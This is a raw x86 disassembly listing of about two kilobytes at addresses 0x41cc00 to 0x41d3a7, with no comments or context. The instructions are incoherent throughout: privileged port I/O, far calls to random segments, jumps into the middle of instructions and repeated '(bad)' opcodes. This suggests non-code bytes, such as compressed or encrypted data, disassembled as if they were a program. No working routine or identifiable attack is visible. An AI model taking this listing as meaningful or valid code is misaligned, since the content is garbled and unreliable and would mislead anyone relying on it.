  41cc00:	enter  0x4541,0xa2
  41cc04:	rcl    DWORD PTR [edi],1
  41cc06:	out    0xea,al
  41cc08:	pop    ebx
  41cc09:	mov    ds:0xe27d4eac,al
  41cc0e:	lock repz pushf 
  41cc11:	push   0xa3220e22
  41cc16:	xchg   ebp,eax
  41cc17:	into   
  41cc18:	lods   al,BYTE PTR ds:[esi]
  41cc19:	push   ebx
  41cc1a:	leave  
  41cc1b:	mov    edx,0x1d137b92
  41cc20:	imul   esp,DWORD PTR [eax+0x3adf379a],0x576dd378
  41cc2a:	mov    cl,0x8
  41cc2c:	and    bl,BYTE PTR [ebp+0x25]
  41cc2f:	imul   ecx,DWORD PTR [ebp+0x34],0xb2e0a221
  41cc36:	xlat   BYTE PTR ds:[ebx]
  41cc37:	sub    esp,DWORD PTR [esi]
  41cc39:	cmp    bh,BYTE PTR [edi]
  41cc3b:	cmp    DWORD PTR [ecx+ecx*1+0x59621aec],esi
  41cc42:	shl    BYTE PTR [edx-0x28b78771],1
  41cc48:	xchg   ebp,eax
  41cc49:	push   0xffffff9e
  41cc4b:	lock in al,0x42
  41cc4e:	in     al,0x80
  41cc50:	jae    0x41cc7b
  41cc52:	retf   
  41cc53:	xor    bh,BYTE PTR [edx+edx*8]
  41cc56:	or     DWORD PTR [edi+0x37],ebx
  41cc59:	loopne 0x41cbfa
  41cc5b:	cmp    BYTE PTR [ebx+0x6ecb949b],bl
  41cc61:	jmp    0x41cc73
  41cc63:	retf   0x3c45
  41cc66:	or     al,0xbc
  41cc68:	fist   DWORD PTR [esi*1-0x4affd18b]
  41cc6f:	cmp    BYTE PTR [ecx],ch
  41cc71:	cld    
  41cc72:	xchg   ebp,eax
  41cc73:	mov    eax,0x107eb15b
  41cc78:	fisttp WORD PTR [ecx]
  41cc7a:	push   esp
  41cc7b:	call   0xaed26081
  41cc80:	sbb    ah,BYTE PTR [edx-0x73397533]
  41cc86:	pop    esi
  41cc87:	jmp    DWORD PTR [eax]
  41cc89:	cmc    
  41cc8a:	adc    al,al
  41cc8c:	repz add DWORD PTR [ecx],ebp
  41cc8f:	jmp    0x45d5e44
  41cc94:	fiadd  WORD PTR [ebx-0x2ee0615d]
  41cc9a:	call   FWORD PTR [ecx+0x4af61897]
  41cca0:	cs adc al,0x99
  41cca3:	jo     0x41cc5c
  41cca5:	sbb    BYTE PTR [edx],al
  41cca7:	ror    DWORD PTR [esi-0x4f909b96],0xfa
  41ccae:	std    
  41ccaf:	push   edi
  41ccb0:	mov    ds:0xc5f5f0d0,al
  41ccb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccb6:	mov    ah,0x5e
  41ccb8:	jmp    0x41cc9a
  41ccba:	jns    0x41cd1d
  41ccbc:	xor    esi,ebx
  41ccbe:	cmp    eax,0xa307addb
  41ccc3:	stos   BYTE PTR es:[edi],al
  41ccc4:	sub    al,0xd8
  41ccc6:	and    ah,bh
  41ccc8:	mov    DWORD PTR ds:0x8de3be4c,esp
  41ccce:	pop    ecx
  41cccf:	arpl   WORD PTR [ebp+0x68e37420],dx
  41ccd5:	cwde   
  41ccd6:	pop    ecx
  41ccd7:	rol    esp,1
  41ccd9:	mov    ah,0x8e
  41ccdb:	enter  0xae55,0x1
  41ccdf:	mov    ebp,0x524b16b3
  41cce4:	pop    ecx
  41cce5:	sbb    al,0x44
  41cce7:	dec    esi
  41cce8:	sub    BYTE PTR [eax+esi*2-0x14],ah
  41ccec:	cdq    
  41cced:	cmc    
  41ccee:	fstp   DWORD PTR [ebx+0x4b]
  41ccf1:	lds    eax,FWORD PTR [esp+esi*2-0x30a4a9f9]
  41ccf8:	xchg   ebx,eax
  41ccf9:	call   0xd99f3633
  41ccfe:	addr16 mov ds:0xe547,al
  41cd02:	inc    eax
  41cd03:	xor    al,BYTE PTR [ebp-0x6ca1f775]
  41cd09:	cmp    esp,DWORD PTR [eax+0x36]
  41cd0c:	sbb    DWORD PTR [esi-0x6],esp
  41cd0f:	cmp    al,0x74
  41cd11:	pop    esi
  41cd12:	iret   
  41cd13:	mov    al,ds:0x5ae6685b
  41cd18:	in     al,0x8f
  41cd1a:	iret   
  41cd1b:	or     BYTE PTR gs:[eax+0x12],al
  41cd1f:	popa   
  41cd20:	sub    BYTE PTR [edi+edx*8],0x45
  41cd24:	inc    ebx
  41cd25:	cmp    eax,0xcc72e22c
  41cd2a:	sub    al,0x10
  41cd2c:	mov    eax,edi
  41cd2e:	inc    eax
  41cd2f:	leave  
  41cd30:	jle    0x41cd2c
  41cd32:	out    0xec,eax
  41cd34:	xchg   esp,eax
  41cd35:	stos   BYTE PTR es:[edi],al
  41cd36:	mov    DWORD PTR [esi+0x748aa327],esi
  41cd3c:	movntq QWORD PTR [ecx],mm1
  41cd3f:	fmul   st(5),st
  41cd41:	fadd   DWORD PTR [ecx+edx*2]
  41cd44:	test   BYTE PTR [esi],al
  41cd46:	add    DWORD PTR [eax+0x3c],esi
  41cd49:	inc    ebp
  41cd4a:	test   esi,0xff84b776
  41cd50:	shl    DWORD PTR [edi-0x215e0590],1
  41cd56:	or     al,0x7c
  41cd58:	xor    eax,0xb6bf1b4a
  41cd5d:	pop    edi
  41cd5e:	xor    BYTE PTR [edx-0x6b],0x8c
  41cd62:	sub    ah,dl
  41cd64:	cmp    DWORD PTR [ebx],eax
  41cd66:	sbb    al,0x73
  41cd68:	ds push ebp
  41cd6a:	mov    ds:0xdb1cce2,al
  41cd6f:	ror    dh,0x77
  41cd72:	xor    DWORD PTR [ebx],esi
  41cd74:	cmc    
  41cd75:	mov    DWORD PTR [eax-0x758611d9],edi
  41cd7b:	push   eax
  41cd7c:	ins    BYTE PTR es:[edi],dx
  41cd7d:	call   0x4b08dad9
  41cd82:	or     bl,BYTE PTR [ebx-0x5e6af4ac]
  41cd88:	jge    0x41cd80
  41cd8a:	inc    edi
  41cd8b:	dec    esi
  41cd8c:	retf   
  41cd8d:	rol    BYTE PTR [edi-0x7f26e90],cl
  41cd93:	stos   BYTE PTR es:[edi],al
  41cd94:	inc    edx
  41cd95:	mov    fs,WORD PTR [edi-0x110a6a38]
  41cd9b:	add    DWORD PTR [ecx],0x40f2a64
  41cda1:	sub    eax,0xf669f147
  41cda6:	sbb    al,BYTE PTR [edi]
  41cda8:	adc    ebx,ecx
  41cdaa:	loope  0x41cd84
  41cdac:	add    cl,BYTE PTR [eax+0x48]
  41cdaf:	push   ebp
  41cdb0:	pushf  
  41cdb1:	xchg   edi,eax
  41cdb2:	push   edx
  41cdb3:	dec    ecx
  41cdb4:	scas   al,BYTE PTR es:[edi]
  41cdb5:	add    BYTE PTR [edx-0x33],al
  41cdb8:	(bad)  
  41cdb9:	dec    ecx
  41cdba:	dec    ecx
  41cdbb:	jmp    0x51436b7
  41cdc0:	js     0x41cdaa
  41cdc2:	popf   
  41cdc3:	lds    esi,FWORD PTR [edi+edx*1]
  41cdc6:	mov    ch,0x39
  41cdc8:	dec    ecx
  41cdc9:	pavgw  mm4,QWORD PTR [edx+0x7ab652e0]
  41cdd0:	loope  0x41ce23
  41cdd2:	dec    esi
  41cdd3:	and    ch,BYTE PTR [edi+ebx*1]
  41cdd6:	add    al,0x5c
  41cdd8:	inc    DWORD PTR [ecx]
  41cdda:	push   edx
  41cddb:	into   
  41cddc:	or     BYTE PTR [ebp+ebp*4+0x6f04df0e],dh
  41cde3:	or     BYTE PTR [ebp-0x30],ah
  41cde6:	jbe    0x41cd9f
  41cde8:	out    dx,eax
  41cde9:	mov    esi,0xe80d9b57
  41cdee:	mov    cl,0x9a
  41cdf0:	test   al,0x6c
  41cdf2:	test   al,0xc8
  41cdf4:	adc    eax,0xfa06f787
  41cdf9:	jns    0x41ce66
  41cdfb:	mov    bh,0xd7
  41cdfd:	and    eax,0x355fc08a
  41ce02:	cdq    
  41ce03:	sub    al,0x97
  41ce05:	imul   edx,DWORD PTR [eax],0xffffffcd
  41ce08:	and    DWORD PTR [ebp-0x9],edi
  41ce0b:	xor    BYTE PTR [ecx],dh
  41ce0d:	addr16 push ss
  41ce0f:	stos   BYTE PTR es:[edi],al
  41ce10:	push   edx
  41ce11:	inc    ecx
  41ce12:	xchg   DWORD PTR [ecx+0x6bd14937],ebx
  41ce18:	shl    DWORD PTR [ebx],1
  41ce1a:	(bad)  
  41ce1b:	or     DWORD PTR [edx-0x1b6a2b2c],edi
  41ce21:	pop    eax
  41ce22:	sbb    bh,ch
  41ce24:	sub    DWORD PTR [esi-0x44390014],edi
  41ce2a:	in     al,0xb9
  41ce2c:	fisttp DWORD PTR [esi]
  41ce2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce2f:	cmp    al,0x47
  41ce31:	imul   edx,DWORD PTR [edi+0x74],0x989e17ad
  41ce38:	(bad)  
  41ce39:	fisub  DWORD PTR [edi+0x1b849ea3]
  41ce3f:	push   edx
  41ce40:	ja     0x41ce22
  41ce42:	mov    bh,0xe3
  41ce44:	sub    cl,dl
  41ce46:	stos   DWORD PTR es:[edi],eax
  41ce47:	xor    esp,esi
  41ce49:	adc    ebp,DWORD PTR [edi+0x65449ccc]
  41ce4f:	imul   ecx,edx,0xb35e317c
  41ce55:	(bad)  
  41ce57:	xchg   esi,eax
  41ce58:	add    al,0xda
  41ce5a:	jle    0x41ce8d
  41ce5c:	das    
  41ce5d:	push   es
  41ce5e:	xor    eax,0x72fa63e7
  41ce63:	jb     0x41ce4d
  41ce65:	jp     0x41cdfd
  41ce67:	in     al,dx
  41ce68:	adc    BYTE PTR [ecx],cl
  41ce6a:	sub    eax,0xac3c8ee6
  41ce6f:	push   ss
  41ce70:	mov    eax,ds:0xbe6c4b8f
  41ce75:	mov    bh,0x6
  41ce77:	nop
  41ce78:	add    DWORD PTR [ebp+0xff7be2d],0x37
  41ce7f:	ror    DWORD PTR [ebp-0x1b974309],1
  41ce85:	inc    edi
  41ce86:	jne    0x41cee6
  41ce88:	jmp    0xed37f22e
  41ce8d:	jg     0x41ce3b
  41ce8f:	jp     0x41ce42
  41ce91:	add    al,bh
  41ce93:	inc    ebx
  41ce94:	gs dec ebx
  41ce96:	mov    ebp,0xffa2ffc8
  41ce9b:	out    dx,al
  41ce9c:	stc    
  41ce9d:	ror    DWORD PTR [eax+0x5347db3],0xce
  41cea4:	jl     0x41cf0f
  41cea6:	js     0x41ce35
  41cea8:	arpl   WORD PTR [edx-0x65],di
  41ceab:	push   ds
  41ceac:	sbb    ebp,DWORD PTR [ebx-0x26c886b]
  41ceb2:	or     BYTE PTR [ebx-0xf],0xb0
  41ceb6:	xor    ch,BYTE PTR [eax+ebp*1-0x77]
  41ceba:	enter  0x2c2c,0x95
  41cebe:	(bad)  
  41cec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec1:	dec    esi
  41cec2:	pop    ecx
  41cec3:	xchg   ebp,eax
  41cec4:	sahf   
  41cec5:	dec    esi
  41cec6:	ins    BYTE PTR es:[edi],dx
  41cec7:	jge    0x41cf21
  41cec9:	push   ebp
  41ceca:	xchg   ecx,eax
  41cecb:	jg     0x41ce72
  41cecd:	rol    ebx,cl
  41cecf:	pop    esi
  41ced0:	sbb    bh,BYTE PTR [esi-0x9]
  41ced3:	push   ebx
  41ced4:	repz sub al,BYTE PTR [ebx-0x19]
  41ced8:	adc    ch,dl
  41ceda:	xlat   BYTE PTR ds:[ebx]
  41cedb:	jg     0x41cf19
  41cedd:	in     al,dx
  41cede:	ror    ch,0x73
  41cee1:	mov    ch,0xa3
  41cee3:	dec    edi
  41cee4:	out    0x1f,eax
  41cee6:	or     ebx,eax
  41cee8:	mov    eax,0x3a403e94
  41ceed:	pop    edi
  41ceee:	popf   
  41ceef:	in     eax,dx
  41cef0:	xchg   ebx,eax
  41cef1:	sub    edi,ebx
  41cef3:	call   0x3e93:0x50e2ea37
  41cefa:	push   eax
  41cefb:	xor    bl,BYTE PTR [eax-0x17]
  41cefe:	loopne 0x41ceb1
  41cf00:	inc    ebp
  41cf01:	in     eax,0xd6
  41cf03:	rcr    BYTE PTR [esi+0x16],cl
  41cf06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf07:	mov    eax,ds:0x8ba97c81
  41cf0c:	mov    ebx,0x4dabb52c
  41cf11:	leave  
  41cf12:	pop    ebx
  41cf13:	push   eax
  41cf14:	dec    ebp
  41cf15:	or     al,0xdd
  41cf17:	add    esp,eax
  41cf19:	rcl    DWORD PTR [ebp-0x4d53fa5f],0xfc
  41cf20:	mov    bh,0x53
  41cf22:	in     eax,dx
  41cf23:	repz pop ecx
  41cf25:	mov    ebp,0xa251d4aa
  41cf2a:	pop    ebp
  41cf2b:	rol    BYTE PTR [edi-0x2a],0xfa
  41cf2f:	ss ss out 0x87,eax
  41cf33:	call   0x67ee:0xda3bca0
  41cf3a:	aad    0x8c
  41cf3c:	test   eax,0xc6fbae2e
  41cf42:	push   0xffffffa8
  41cf44:	sub    eax,0x2a5f58e2
  41cf49:	(bad)  
  41cf4a:	xchg   ebx,eax
  41cf4b:	dec    ecx
  41cf4c:	and    DWORD PTR [edi-0x63],ebx
  41cf4f:	les    ecx,FWORD PTR [eax]
  41cf51:	and    BYTE PTR [ecx-0x3a4ce66e],bh
  41cf57:	fwait
  41cf58:	out    dx,eax
  41cf59:	outs   dx,DWORD PTR ds:[esi]
  41cf5a:	push   ebp
  41cf5b:	lock pop ebp
  41cf5d:	(bad)  
  41cf5e:	aas    
  41cf5f:	je     0x41cf3c
  41cf61:	jo     0x41cf84
  41cf63:	inc    ebx
  41cf64:	daa    
  41cf65:	dec    WORD PTR [esi]
  41cf68:	(bad)  
  41cf6a:	xchg   edx,eax
  41cf6b:	fs or  al,0x4f
  41cf6e:	add    BYTE PTR [ecx-0x3e],ch
  41cf71:	(bad)  [edx]
  41cf73:	xor    eax,0x8b77a78b
  41cf78:	jne    0x41cf94
  41cf7a:	fidivr WORD PTR [edi+0x17]
  41cf7d:	je     0x41cfdb
  41cf7f:	and    eax,DWORD PTR [ecx-0x37]
  41cf82:	add    BYTE PTR [eax],dh
  41cf84:	and    bh,BYTE PTR [edx+0x7460395]
  41cf8a:	fistp  QWORD PTR [edx-0x2914e3e3]
  41cf90:	cmp    al,0x57
  41cf92:	push   ecx
  41cf93:	nop
  41cf94:	push   es
  41cf95:	out    0xd8,al
  41cf97:	sbb    DWORD PTR [eax+ebx*2-0x4c22e0fe],ecx
  41cf9e:	xchg   edx,eax
  41cf9f:	ss xor eax,0x5623113
  41cfa5:	inc    esp
  41cfa6:	dec    ecx
  41cfa7:	add    eax,0x3ad417e1
  41cfac:	ja     0x41cfc3
  41cfae:	pop    edi
  41cfaf:	or     ebx,ebp
  41cfb1:	cmp    edx,edi
  41cfb3:	arpl   WORD PTR [ecx-0x1a1e6428],di
  41cfb9:	iret   
  41cfba:	mov    ah,0xd9
  41cfbc:	rcr    DWORD PTR [ecx],1
  41cfbe:	in     eax,dx
  41cfbf:	rcl    BYTE PTR [edx+0x49],0x4f
  41cfc3:	or     cl,BYTE PTR [eax+0x10c02ae8]
  41cfc9:	mov    ecx,0x74ef85cd
  41cfce:	push   ebx
  41cfcf:	loopne 0x41cfe1
  41cfd1:	sbb    esi,DWORD PTR [eax+0x46]
  41cfd4:	retf   0x1447
  41cfd7:	xchg   ebx,eax
  41cfd8:	mov    esi,DWORD PTR ds:0xb96293c
  41cfde:	jns    0x41d020
  41cfe0:	xchg   DWORD PTR [edx-0x2c],esp
  41cfe3:	and    BYTE PTR [edx+0x5a],cl
  41cfe6:	enter  0xc9b1,0xc5
  41cfea:	mov    bl,0x97
  41cfec:	dec    ebp
  41cfed:	xor    al,0xd8
  41cfef:	int3   
  41cff0:	mov    DWORD PTR ds:0x6657d2b8,ebp
  41cff6:	aaa    
  41cff7:	pop    edx
  41cff8:	and    DWORD PTR [eax+0x26],edx
  41cffb:	call   0x1e3b:0xe5b6afd8
  41d002:	jb     0x41cfe8
  41d004:	ins    BYTE PTR es:[edi],dx
  41d005:	stos   BYTE PTR es:[edi],al
  41d006:	(bad)  
  41d007:	pop    edx
  41d008:	cwde   
  41d009:	jb     0x41d07e
  41d00b:	and    eax,0x64a87296
  41d010:	mov    ds:0xfb7d1062,eax
  41d015:	pop    eax
  41d016:	leave  
  41d017:	jae    0x41d072
  41d019:	sbb    cl,BYTE PTR ds:0x34288154
  41d01f:	push   ebx
  41d020:	retf   
  41d021:	dec    ebp
  41d022:	stos   BYTE PTR es:[edi],al
  41d023:	pop    es
  41d024:	and    eax,0x322bf675
  41d029:	xchg   esi,eax
  41d02a:	fld    DWORD PTR [ebp-0x58f107bb]
  41d030:	add    BYTE PTR [esi-0x32],ah
  41d033:	pop    esi
  41d034:	mov    DWORD PTR [ecx],edx
  41d036:	push   edi
  41d037:	pusha  
  41d038:	pop    ss
  41d039:	jmp    0xd8b0:0xca255413
  41d040:	and    eax,0x59d6111d
  41d045:	rcl    DWORD PTR [esi-0x1e07e6fe],0xc3
  41d04c:	mov    esi,0x8baba507
  41d051:	inc    edx
  41d052:	inc    ecx
  41d053:	adc    ecx,DWORD PTR [ebx]
  41d055:	push   ebp
  41d056:	pop    es
  41d057:	leave  
  41d058:	mov    ecx,0xc0c10f2b
  41d05d:	adc    al,ah
  41d05f:	mov    ch,0xb4
  41d061:	retf   
  41d062:	adc    ebx,DWORD PTR [edx+0x62]
  41d065:	mov    esp,ebp
  41d067:	(bad)  
  41d068:	retf   0xbeac
  41d06b:	imul   edx,DWORD PTR [eax+0x10],0x937f0ed3
  41d072:	das    
  41d073:	mov    edi,0xd8342d11
  41d078:	dec    edx
  41d079:	fnstenv [edx-0x4f763982]
  41d07f:	pop    ss
  41d080:	test   DWORD PTR [edx-0x1ef899de],esi
  41d086:	or     al,al
  41d088:	sub    cl,dh
  41d08a:	das    
  41d08b:	pusha  
  41d08c:	icebp  
  41d08d:	ror    bl,cl
  41d08f:	sub    BYTE PTR [ebp-0x2746d538],ch
  41d095:	fbstp  TBYTE PTR [eax+edx*2-0x331b0bd6]
  41d09c:	ret    0x8dcd
  41d09f:	jae    0x41d105
  41d0a1:	ror    BYTE PTR [eax+0x7dbc1dc4],1
  41d0a7:	mov    cl,0x2c
  41d0a9:	jl     0x41d11e
  41d0ab:	in     al,dx
  41d0ac:	aas    
  41d0ad:	lds    esp,FWORD PTR [edx-0xbaa893c]
  41d0b3:	loope  0x41d08c
  41d0b5:	or     BYTE PTR [esi+0x353af615],al
  41d0bb:	loope  0x41d045
  41d0bd:	xor    BYTE PTR [edi+0x19],al
  41d0c0:	xor    al,0x4a
  41d0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0c3:	jp     0x41d0fd
  41d0c5:	pushf  
  41d0c6:	ins    BYTE PTR es:[edi],dx
  41d0c7:	test   BYTE PTR [esi-0x43],0x34
  41d0cb:	rcr    DWORD PTR [edi-0x2b351d35],cl
  41d0d1:	sbb    cl,BYTE PTR [ecx-0x2e980f33]
  41d0d7:	adc    DWORD PTR [edx-0x5a1aa49f],eax
  41d0dd:	or     eax,0x13aa2ee1
  41d0e2:	mov    eax,ds:0x831189e2
  41d0e7:	mov    ebx,0xca136b90
  41d0ec:	mov    edx,0xcfa43767
  41d0f1:	pop    eax
  41d0f2:	lock test eax,0x3694d4d3
  41d0f8:	xor    DWORD PTR [esi-0x3ed63cb1],0x76724e12
  41d102:	mov    esp,0xc3a0e1fc
  41d107:	loope  0x41d144
  41d109:	and    bl,al
  41d10b:	adc    ch,BYTE PTR [ebx-0xfd0a868]
  41d111:	add    esi,edx
  41d113:	scas   al,BYTE PTR es:[edi]
  41d114:	push   ss
  41d115:	adc    eax,0x294a88eb
  41d11a:	xor    eax,0x29da133
  41d11f:	cmp    DWORD PTR [edx+0x71],0xffffff91
  41d123:	popa   
  41d124:	addr16 icebp 
  41d126:	xchg   ecx,eax
  41d127:	dec    esi
  41d128:	pop    ebp
  41d129:	xor    BYTE PTR [edi],bh
  41d12b:	push   cs
  41d12c:	fisttp WORD PTR [ebp+0x38]
  41d12f:	mov    dl,0xf4
  41d131:	test   eax,0x60f41eaa
  41d136:	sbb    ah,ah
  41d138:	pusha  
  41d139:	pop    ecx
  41d13a:	adc    edx,DWORD PTR [edx+edx*1-0x7d]
  41d13e:	psubq  mm2,QWORD PTR [esi]
  41d141:	fld    QWORD PTR ds:0x14513b02
  41d147:	js     0x41d0cc
  41d149:	mov    edx,0x96e655c0
  41d14e:	jmp    0x41d17f
  41d150:	cmp    al,0x65
  41d152:	test   DWORD PTR [esi],eax
  41d154:	xchg   cl,ah
  41d156:	jne    0x41d165
  41d158:	sbb    al,0xad
  41d15a:	sub    DWORD PTR [ebx],esi
  41d15c:	test   edx,0xc3e7e9ea
  41d162:	jmp    0x41d0e9
  41d164:	jmp    0xe444:0xfe24f887
  41d16b:	sbb    al,0x65
  41d16d:	in     eax,dx
  41d16e:	pop    ecx
  41d16f:	ins    BYTE PTR es:[edi],dx
  41d170:	push   eax
  41d171:	(bad)  
  41d173:	call   FWORD PTR [ecx+0x70]
  41d176:	dec    eax
  41d177:	shl    DWORD PTR [ebx-0x40],0x3b
  41d17b:	sahf   
  41d17c:	or     al,0x84
  41d17e:	jecxz  0x41d127
  41d180:	push   ss
  41d181:	xchg   edi,eax
  41d182:	repz add al,0x97
  41d185:	and    al,0x7c
  41d187:	or     DWORD PTR [ebx-0x43],eax
  41d18a:	and    DWORD PTR [ecx+0x61],esp
  41d18d:	sbb    ch,BYTE PTR [ebp-0x3]
  41d190:	mov    WORD PTR [eax-0x55],ds
  41d193:	fimul  WORD PTR [esp+edx*4+0x44d0bdca]
  41d19a:	push   0xffffff82
  41d19c:	pop    esi
  41d19d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d19f:	xor    dh,BYTE PTR [ebx+0x79f64aec]
  41d1a5:	add    BYTE PTR [ebp+ecx*2-0x77fe9b59],ch
  41d1ac:	iret   
  41d1ad:	fmulp  st(0),st
  41d1af:	out    dx,eax
  41d1b0:	add    DWORD PTR [edi],ecx
  41d1b2:	jno    0x41d1a5
  41d1b4:	sbb    esi,DWORD PTR [esi]
  41d1b6:	mov    dh,0x29
  41d1b8:	add    dh,BYTE PTR [ebp-0x69f48148]
  41d1be:	(bad)  
  41d1bf:	and    dl,BYTE PTR [ebx-0x1caf8ef9]
  41d1c5:	dec    edx
  41d1c6:	dec    edi
  41d1c7:	cmp    BYTE PTR ds:0x826c5cd3,cl
  41d1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ce:	jl     0x41d160
  41d1d0:	adc    DWORD PTR [edi-0x4edd2890],0x64
  41d1d7:	inc    edi
  41d1d8:	inc    esi
  41d1d9:	imul   eax,DWORD PTR [ebp+0x5c784963],0x71fad063
  41d1e3:	ret    
  41d1e4:	mov    eax,ds:0xc673b754
  41d1e9:	pop    ebp
  41d1ea:	arpl   WORD PTR [edi-0x285e9ee9],sp
  41d1f0:	call   0x16c6:0x82f241c5
  41d1f7:	ss in  al,dx
  41d1f9:	mov    ?,WORD PTR [eax+esi*4-0x1a552ac8]
  41d200:	fst    st(6)
  41d202:	shr    esp,0xde
  41d205:	outs   dx,DWORD PTR ds:[esi]
  41d206:	sub    al,0x7e
  41d208:	loop   0x41d20e
  41d20a:	mov    ebx,0xe07021ba
  41d20f:	test   eax,0xc6de17d6
  41d214:	xchg   DWORD PTR [esi],ecx
  41d216:	cdq    
  41d217:	leave  
  41d218:	(bad)  
  41d219:	stos   DWORD PTR es:[edi],eax
  41d21a:	push   edx
  41d21b:	nop
  41d21c:	adc    ebx,esp
  41d21e:	fiadd  DWORD PTR [ebx]
  41d220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d221:	or     al,0x3a
  41d223:	pop    dx
  41d225:	mov    BYTE PTR [eax+0x4bddca1a],ch
  41d22b:	add    DWORD PTR [eax-0x315a371f],esp
  41d231:	mov    ds:0x4b83ddc6,eax
  41d236:	out    dx,al
  41d237:	pop    ebp
  41d238:	test   edx,edx
  41d23a:	popf   
  41d23b:	leave  
  41d23c:	mov    bl,BYTE PTR [ecx-0x3be4e287]
  41d242:	call   0x460b:0x9aa17c02
  41d249:	sub    eax,0x63102032
  41d24e:	inc    edi
  41d24f:	out    dx,eax
  41d250:	or     BYTE PTR [edi-0x23],dh
  41d253:	dec    edx
  41d254:	mov    ds:0x1b3b68d6,eax
  41d259:	cwde   
  41d25a:	sub    BYTE PTR [eax-0x28386184],0xe0
  41d261:	in     al,dx
  41d262:	add    eax,0x1c1fbe2b
  41d267:	and    eax,0x8f59e4b9
  41d26c:	xchg   ebp,eax
  41d26d:	pop    ebx
  41d26e:	hlt    
  41d26f:	les    esp,FWORD PTR [ebp+0x63]
  41d272:	cmp    BYTE PTR [ebp-0x43],ch
  41d275:	jle    0x41d208
  41d277:	mov    ecx,0xde1ecc7e
  41d27c:	and    ah,BYTE PTR [edi]
  41d27e:	fadd   DWORD PTR [esi]
  41d280:	test   DWORD PTR [ecx+0x79a20780],ebp
  41d286:	sub    BYTE PTR [edi-0x27],al
  41d289:	mov    dh,BYTE PTR [eax+0x7a]
  41d28c:	out    0x13,al
  41d28e:	jge    0x41d27c
  41d290:	dec    esp
  41d291:	sub    BYTE PTR [eax-0x69],dh
  41d294:	lds    ebx,FWORD PTR [eax-0x57]
  41d297:	add    al,0x65
  41d299:	cmp    DWORD PTR [edx+0x6d],ebx
  41d29c:	out    dx,eax
  41d29d:	aas    
  41d29e:	mov    esi,0xd4c9bf45
  41d2a3:	inc    DWORD PTR [edi-0x418a5fd1]
  41d2a9:	ja     0x41d2f7
  41d2ab:	xchg   esi,eax
  41d2ac:	das    
  41d2ad:	aas    
  41d2ae:	mov    esp,0xdfb2f0ab
  41d2b3:	mov    ah,0x9e
  41d2b5:	out    dx,eax
  41d2b6:	push   esp
  41d2b7:	imul   eax,DWORD PTR [eax+0x50],0xce0926fd
  41d2be:	ins    BYTE PTR es:[edi],dx
  41d2bf:	cmc    
  41d2c0:	loope  0x41d272
  41d2c2:	sub    DWORD PTR [edx],ebp
  41d2c4:	sub    eax,0x6094a074
  41d2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2ca:	pop    edi
  41d2cb:	cmp    bh,cl
  41d2cd:	stos   DWORD PTR es:[edi],eax
  41d2ce:	xchg   BYTE PTR [ebx-0x5b2a83e5],dl
  41d2d4:	clc    
  41d2d5:	pop    ebp
  41d2d6:	sbb    DWORD PTR [ebp-0x673903a2],ecx
  41d2dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2dd:	lods   al,BYTE PTR ds:[esi]
  41d2de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2df:	or     DWORD PTR [ebx+0x57ddc50],ebx
  41d2e5:	xchg   dl,bl
  41d2e7:	bound  esp,QWORD PTR [eax]
  41d2e9:	sbb    ch,BYTE PTR [ebx]
  41d2eb:	cmp    DWORD PTR [ecx+0xf2dd2af],esp
  41d2f1:	(bad)  
  41d2f2:	jmp    DWORD PTR [edx+0x42]
  41d2f5:	mov    esp,0x80bf77ad
  41d2fa:	mov    ah,0xae
  41d2fc:	fnop   
  41d2fe:	in     al,dx
  41d2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d300:	les    ecx,FWORD PTR [eax-0x4ed4679c]
  41d306:	imul   BYTE PTR [esi-0x5f]
  41d309:	dec    ebp
  41d30a:	add    ah,BYTE PTR [edi+ecx*1+0x22a797c]
  41d311:	cmp    cl,BYTE PTR [edi]
  41d313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d314:	push   edx
  41d315:	daa    
  41d316:	cs call 0x26dd596d
  41d31c:	fsubr  QWORD PTR [ebp+0x9d8ea53]
  41d322:	rcr    DWORD PTR [edi+0x57f0d913],0x5e
  41d329:	cdq    
  41d32a:	lahf   
  41d32b:	pusha  
  41d32c:	mov    eax,DWORD PTR [edx-0x718485e5]
  41d332:	jo     0x41d2e8
  41d334:	mov    DWORD PTR [ebp-0x6689d023],edi
  41d33a:	and    al,0x68
  41d33c:	fwait
  41d33d:	mov    ah,bh
  41d33f:	add    bh,ch
  41d341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d342:	xor    dl,bl
  41d344:	push   ebp
  41d345:	cli    
  41d346:	ss pop ecx
  41d348:	jmp    0x4378:0x4b3c9ce
  41d34f:	nop
  41d350:	mov    cl,0xd
  41d352:	loop   0x41d2e1
  41d354:	jmp    0xce3fc243
  41d359:	sub    ch,bh
  41d35b:	push   ebp
  41d35c:	inc    ecx
  41d35d:	data16 in al,0xb3
  41d360:	into   
  41d361:	cmc    
  41d362:	mov    edx,DWORD PTR [ecx]
  41d364:	ja     0x41d2f5
  41d366:	mov    al,ds:0x4289f2f6
  41d36b:	jo     0x41d3e3
  41d36d:	mov    ebx,0x9660f9ed
  41d372:	lods   ax,WORD PTR gs:[esi]
  41d375:	out    dx,al
  41d376:	fldcw  WORD PTR ds:0x9afcda1a
  41d37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d37d:	lods   eax,DWORD PTR ds:[esi]
  41d37e:	jecxz  0x41d3db
  41d380:	xor    al,0x5a
  41d382:	push   esi
  41d383:	repz push edx
  41d385:	test   eax,0xe1824cfd
  41d38a:	pop    edi
  41d38b:	xor    BYTE PTR [ebp+0xd9a3633],bh
  41d391:	and    DWORD PTR [ecx+0x3d1d40b8],esi
  41d397:	xlat   BYTE PTR ds:[ebx]
  41d398:	xadd   BYTE PTR [edi-0x7d1a6a87],dh
  41d39f:	fbstp  TBYTE PTR [ebp+0x24]
  41d3a2:	cmp    eax,0x516f1c85
  41d3a7:	ficom  WORD PTR [eax]
